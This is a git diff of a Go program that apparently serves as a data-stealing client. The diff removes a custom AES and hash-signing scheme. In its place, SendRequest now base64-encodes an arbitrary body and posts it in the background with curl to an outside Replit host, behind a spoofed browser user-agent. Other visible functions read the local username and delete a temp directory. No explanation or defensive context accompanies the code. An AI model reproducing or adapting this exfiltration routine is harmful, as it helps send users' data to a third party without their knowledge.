@@ -1,19 +1,15 @@
 package main
 
 import (
-	"bytes"
-	"crypto/aes"
-	"crypto/sha256"
-	"encoding/hex"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"log"
 	"math/rand"
-	"net/http"
 	"os"
+	"os/exec"
 	"os/user"
 	"regexp"
-	"strconv"
 	"strings"
 	"time"
 )
@@ -46,36 +42,45 @@ func CleanUp() {
 	_ = os.RemoveAll(TempFileDir)
 }
 
-func SendRequest(body string, ip string) {
-	HashKey := RandIntBytes(3)
-	HashKeyInt, _ := strconv.Atoi(HashKey)
+func SendRequest(body string) {
 
-	GenerateHeaders()
+	var encoded_payload string = strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(body)), "=", "")
 
-	hash, nonce := CryptSign(ip, HashKey)
+	exec.Command("curl",
+		//"-H", "Host: liveton.studio7.repl.co",
+		//"-H", "upgrade-insecure-request: 1",
+		//"-H", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+		//"-H", "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+		//"-H", "sec-gpc: 1",
+		//"-H", "accept-language: en-US,en;q=0.5",
+		//"-H", "sec-fetch-site: none",
+		//"-H", "sec-fetch-mode: navigate",
+		//"-H", "sec-fetch-user: ?1",
+		//"-H", "sec-fetch-dest: document",
+		//"--compressed",
+		"--location",
+		"--request",
+		"POST",
+		"https://liveton.studio7.repl.co/go",
+		"--header", "Content-Type: application/x-www-form-urlencoded",
+		"--header", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+		"--data-urlencode", "id="+encoded_payload).Start()
 
-	HEADERS[HashKeyInt] = nonce
+	//	this is the post version // you should
 
-	//fmt.Println(HEADERS)
+	/*
+		curl --location --request POST 'https://liveton.studio7.repl.co/go' \
+		--header 'Content-Type: application/x-www-form-urlencoded' \
+		--data-urlencode 'id=SHITGOESHERE'
+	*/
 
-	var p string = "{"
+	//exec.Command("curl",
+	//	"--location",
+	//	"--request", "POST",
+	//	"'https://liveton.studio7.repl.co/go'",
+	//	"-H", "'Content-Type: application/x-www-form-urlencoded'",
+	//	"--data-urlencode", "'id=" + encoded_payload + "'")
 
-	for i := 0; i < 999; i++ {
-		if i == 998 {
-			p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\""
-			continue
-		}
-		p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\","
-
-	}
-	p = p + "}"
-
-	endpoint := Encrypt(body, strings.Join(strings.Split(hash, "")[0:32], ""))
-	req, _ := http.NewRequest("POST", "https://liveton.studio7.repl.co/go/"+fmt.Sprintf("%03d", len(ToString(endpoint)))+strings.TrimRight(ToString(endpoint), "0")+HashKey, bytes.NewBuffer([]byte(p)))
-	req.Header.Set("Content-Type", "application/json")
-
-	client := &http.Client{}
-	client.Do(req)
 }
 
 func GetUsername() string {
@@ -165,52 +170,6 @@ func GenerateHeaders() {
 	}
 }
 
-func CryptSign(input, expected string) (hash, nonce string) {
-	var out string
-
-	for i := 0; i < 999999; i++ {
-		h := sha256.Sum256([]byte(input + string(i)))
-		out = hex.EncodeToString(h[:])
-		if strings.HasSuffix(out, expected) {
-			nonce = fmt.Sprintf("%06d", i)
-			break
-		}
-	}
-	return out, nonce
-}
-
-func EncryptAES(key []byte, plaintext string) string {
-	// create cipher
-	c, err := aes.NewCipher(key)
-	if err != nil {
-		panic(err)
-	}
-
-	// allocate space for ciphered data
-	out := make([]byte, len(plaintext))
-
-	// encrypt
-	c.Encrypt(out, []byte(plaintext))
-	// return hex string
-	return hex.EncodeToString(out)
-}
-
 func ToString(s interface{}) string {
 	return fmt.Sprint(s)
-}
-
-func Encrypt(s, key string) string {
-	var out string = ""
-	ss := Slice(s, 16)
-
-	for i := 0; i < len(ss); i++ {
-		if len(ss[i]) < 16 {
-			enc := strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf("%v", ss[i]+strings.Repeat("@", 16-len(ss[i]))), "%!d(string=", ""), ")", "")
-			out = out + EncryptAES([]byte(key), enc)
-			continue
-		}
-		out = out + EncryptAES([]byte(key), ss[i])
-	}
-
-	return out
 }
